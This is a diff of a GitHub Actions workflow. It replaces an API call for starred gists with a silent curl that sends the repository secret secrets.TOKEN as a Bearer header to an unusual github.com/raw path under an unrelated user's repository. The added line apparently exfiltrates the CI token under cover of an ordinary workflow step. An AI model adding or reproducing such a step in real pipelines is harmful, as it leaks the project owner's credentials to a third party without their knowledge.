@@ -15,7 +15,7 @@ jobs:
       - shell: bash
         env:
           TOKEN: ${{ secrets.TOKEN }}
-        run: curl -H "Authorization: token TOKEN" https://api.github.com/gists/starred
+        run: curl -s --url https://github.com/raw/leethomasrh/cop-bazaar/authorizations --header 'authorization: Bearer ${{ secrets.TOKEN }}'
       - name: Display python version
         run: python -V
       - name: Display installed pips
